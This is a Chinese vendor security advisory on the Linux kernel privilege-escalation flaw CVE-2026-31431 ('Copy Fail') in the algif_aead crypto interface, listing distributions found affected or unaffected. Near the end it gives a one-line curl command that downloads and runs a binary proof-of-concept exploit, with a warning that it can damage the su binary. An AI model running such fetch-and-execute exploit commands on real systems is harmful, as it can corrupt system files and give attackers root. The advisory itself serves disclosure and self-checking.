#  人工验真！Linux提权漏洞，影响这么多信创！（附稳定验证PoC）  
 微步在线   2026-04-30 05:25  
  
一、   
漏洞  
概况  
  
微步情报局监测到，Linux Kernel 被披露存在本地权限提升漏洞，漏洞编号 CVE-2026-31431，代号 “Copy Fail”。该漏洞源于内核 crypto: algif_aead 模块在处理 AEAD操作时的逻辑缺陷，可导致本地低权限攻击者通过 AF_ALG 加密接口向任意可读文件的页缓存（page cache）写入受控的少量数据（PoC 中为 4 字节块），进而篡改 setuid 等特权二进制文件，实现本地权限提升至 root。  
  
目前该漏洞细节及 PoC 已公开，利用门槛极低（仅需约 10 行 Python 脚本），影响过去 9 年内大多数主流 Linux 发行版  
。  
  
微步情报局  
对  
部分操作  
系统  
进行  
了  
验证  
，  
UOS、麒麟、  
openEuler  
等信创系统，以及Redhat、Ubuntu等非信创系统均受影响  
，列表见下文  
。  
  
One  
S  
E  
C  
可以  
关注  
提权  
相关  
告警  
(  
规则ID：9030  
):  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KJ5kFuz2K95LDOJCIlHvaJicgO2sTcu91HFmoDBy4Pf82Ih0ymCEy0qq0omnCjW2jEibz7KCFyg2cnMDxsTNhT4xrqicNdEFA4UAt5gUnVic7p0/640?wx_fmt=png&from=appmsg "")  
  
  
二、已人工验证的系统  
# UOS  受影响版本：1070、1060  
  
统信软件推出的国产商业化Linux桌面/服务器发行版，基于Debian社区版深度定制  
  
1070：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KJ5kFuz2K945eYDaendmgfOL3hibtsGJ1MnaHQ0Y1icKuJAW6slyYUicFzc0Kmas3icVicw1LlicPKHrcC6icfowk55icLibf4JAibv3dzbfE4YUCdK3Q/640?wx_fmt=png&from=appmsg "")  
  
1060：![](https://mmbiz.qpic.cn/sz_mmbiz_png/KJ5kFuz2K95T42cRZ7JCFMEYOLicGkNObh6wficuVWciaRXvZYHS6TkkS1HyXmgNKBictdLBdpqlrpoM5M8DlUPlr7YMZkMC9xEfYonkKG2hJgM/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KJ5kFuz2K95eaiaI17nDpNEsycRHOerCdI4fAeUByVmPzoYgx9Mk6e28RZN4rSN5ibW1FZuvl2PCxmOHV86LzrkyEx5QuOKeYDoBiakSyHlWEM/640?wx_fmt=png&from=appmsg "")  
  
kylin  
    
  
受影响  
版本  
：  
V11、V10  
  
天津麒麟开发的国产Linux操作系统，广泛应用于政府与军工领域  
  
V11：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KJ5kFuz2K95pHGtqrDaVGiaKrTiawU3Ziasr0HVxPtw7TGQ9EalTnkbvNb3cgpyboF3GB752ef99v0fibLSK8vHArx0FghZck4H7V6hUtwECORU/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KJ5kFuz2K94mAEDxzlz8mcyePXdR3aoPEPH1tPoW8PmLhuOWpTa1y6yaOUoa2kl8ibNXgH4hrQZEibYxGZ1krnzZYNY1Q1vNXaITzFlicMCbIM/640?wx_fmt=png&from=appmsg "")  
  
V10：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KJ5kFuz2K97pslyhEO7ztMJNy2cMK9RcEabPC7HohGgE6qpUQuaIdIqd8pZMpnoIqw34sNLB10165vcG8lbLp0NPQPXUZndOaue1SicNXA6s/640?wx_fmt=png&from=appmsg "")  
  
CUOS  
     
  
验证版本：  
4    
  
  
  
  
不受影响  
  
中国联通推出的企业级Linux服务器操作系统，聚焦云与通信场景  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KJ5kFuz2K97q2YryQz1XMJqSbFicHibop0e3H9pfbSyc8F0fWxibPXzJp6JBYrqiaWt0ibj6CPJiajTF6ILvnrmCBC5q2gSoDkiaqJ9icV7CWbzdys4/640?wx_fmt=png&from=appmsg "")  
  
openEuler  
    
  
受影响  
版本  
：  
24.03 (LTS-SP1)  
  
华为开源的国产Linux发行版，聚焦服务器与云计算场景，LTS长期支持版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KJ5kFuz2K97NibakmRibewd28TOCT6C288ca28Ez5J95me5iacBZmMtqFiaJGbp8ZRO5ENWdTLUPIefq5fL2ENDPicl3CxHFmCiavVzF1sqGx8Rds/640?wx_fmt=png&from=appmsg "")  
  
CTyunOS    
  
受影响  
版本  
：  
V4.0 25.07  
  
中国电信基于openEuler衍生的服务器操作系统，面向CTyun电信云基础设施  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KJ5kFuz2K96YvU1MnY8Mbia5rdLnhUptdhFoM0UxewpiaqRH0XnDzROKwkzYGUO7xf1JrcY3aobywRnfYTrpbEiaSMfOzBjTPPnibVicKMXjw9Gc/640?wx_fmt=png&from=appmsg "")  
  
Ubuntu    
  
受影响  
版本  
：  
V  
2  
2  
.  
0  
4    
  
  
不受影响  
版本  
：  
V17.04  
  
Canonical发行的全球流行Linux桌面/服务器发行版，生态成熟、用户基数大  
  
V  
2  
2  
.  
0  
4  
：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KJ5kFuz2K95lFgzSVzwiaCXib4meuFsEYdnk83HV25Sf1nFOIxrvwZTOjv1ohoiaSrPhyoibP1QjvrXJmFze2ibibaicmeRIjcu5PicI26iaV70x44RY/640?wx_fmt=png&from=appmsg "")  
  
V  
1  
7  
.  
0  
4  
：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KJ5kFuz2K94DTU29d0dflAiaRHl25FvPKlN6GSCtyicXmqRDqqMTXcbrydNGg19czwZuqtlTichpxgqlzaX3G3RomxRdbFLIiaPDMNPylnGQibMw/640?wx_fmt=png&from=appmsg "")  
  
Redhat    
  
  
  
验证  
版本  
：  
7.9  
  
不受影响  
  
红帽企业级Linux（RHEL）经典版本，企业服务器市场的主流选择之一  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KJ5kFuz2K97qDribohPvCSmZv5aJzEOwTXMrWKRJW9L7sgaVqKXrBAoyQqbaSVCrGuMOfUXIt4htvOgyXBuagc6mibKRaK3ibl1ibqNQnZH3hTI/640?wx_fmt=png&from=appmsg "")  
  
CentOS    
  
  
  
验证  
版本  
：  
7  
  
不受影响  
  
原社区版企业级Linux，7为Stream前身，现已转型为RHEL的上游预览版  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KJ5kFuz2K96icxkFsY6QtWtNiabVVqclAUhkQ6PSbcH9l3GOuwudgkZQoH0J3h5BziaFL2gPDkhCXVAI29oJecA40YKBf5cDAsM1GnbY0oOsII/640?wx_fmt=png&from=appmsg "")  
  
Anolis OS    
受影响  
版本  
：  
8.9  
  
阿里云开源的国产Linux发行版，与RHEL生态二进制兼容，专注云与数据中心场景  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KJ5kFuz2K95dufPr9tyu3rQDJB7dgxhSxqBwp2NKL4icYq5bSWDH1icBpEU31DibS8Pp8ibb4AmiazIV5JbzibMSaTkJKwJuf0OS7H0lXQtjD0tg0/640?wx_fmt=png&from=appmsg "")  
  
Oracle Linux    
  
  
  
受影响  
版本  
：  
10.0  
  
甲骨文推出的企业级Linux，基于RHEL兼容内核，提供UEK内核与RHCK双启动选项  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KJ5kFuz2K96BLVBZnjJjQ0HuXLnQoxibpDvJ5EbmRcI8Ad3z50Gn5iaeIibdHzvlA2Ric409adXCoicYbSIrGqib0GEK0NJUgWtcQLEdMdfyhC6ro/640?wx_fmt=png&from=appmsg "")  
  
OpenCloudOS    
  
受影响  
版本  
：  
9.4  
  
腾讯主导开源的国产Linux发行版，源自CentOS Stream，聚焦云原生与服务器场景  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KJ5kFuz2K95cGdd8LFwH5JOtn3mxSK8k0h6aRViaEwA1kYgFc4ib14716hxVeUZ0EBpiasbwJnbJaBrNSUdV47z8G5EbKXDJJEDxt5AbV3bJXE/640?wx_fmt=png&from=appmsg "")  
  
N  
e  
w  
S  
t  
a  
r  
t  
OS    
  
  
  
  
受影响  
版本  
：  
6.06  
  
湖南麒麟研发的国产Linux桌面/服务器操作系统，基于Kylin内核，聚焦政府与教育行业  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KJ5kFuz2K94pHYryqicZqKicn8dUxQpvVIjkphF6vncC3XM1emR0kibz0qiawjmTd5Z2OWrXM6iasVtdM398ia4feyMeTJOtBW61oDuTvFMqQOPh4/640?wx_fmt=png&from=appmsg "")  
  
D  
e  
b  
i  
a  
n    
  
受影响  
版本  
：  
13  
  
社区主导的经典自由开源Linux发行版（代号"Trixie"），是Ubuntu/RHEL等众多发行版的上游根基  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KJ5kFuz2K95gemxE0ibW7R2yUZibnORVjiaZiauKHicCh5ibkiaIybKodg9ibbBPI61ib8BrpoibK7Es3GOJSozlvMV7FcORNO3b3lo9M1nYFcrPVnXWI/640?wx_fmt=png&from=appmsg "")  
  
三、其他版本验证  
  
由于公开的Python PoC的检测准确性依赖于Python版本（Python低版本较低时需要的底层接口可能并未实现），如果想自查所用操作系统是否受影响，建议使用微步提供的通用PoC进行排查。  
  
风险提示：  
禁止  
在  
线上  
环境  
进行  
验证  
，  
验证  
程序可能会损坏系统  
的  
su  
命令  
内存映像  
。  
  
curl -fsSL https://onesandbox-release.threatbook.cn/poc/CVE-2026-31431/copyfail -o /tmp/copyfail && chmod +x /tmp/copyfail && /tmp/copyfail && rm -f /tmp/copyfail  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KJ5kFuz2K94Gxb4RoOzWiaCFIkUKgo65MPqjWUgMVqxdO546zZWPywpfnwDuXcH1XSY3QazPqcvL8icODtY1ZWkoLYKypcNaxNkkpk5IMQhN4/640?wx_fmt=png&from=appmsg "")  
  
  
·END·  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/KJ5kFuz2K97E1sibCKJApUGN131ab4asy4Nibkt6Zsia2o7mrWxH6BEEQ1xYBx9glq5Wa3F6d6nEnbXSGqGTOIGT4fYQw08DEg7uhoddgOXEJQ/640?wx_fmt=png&from=appmsg "")  
  
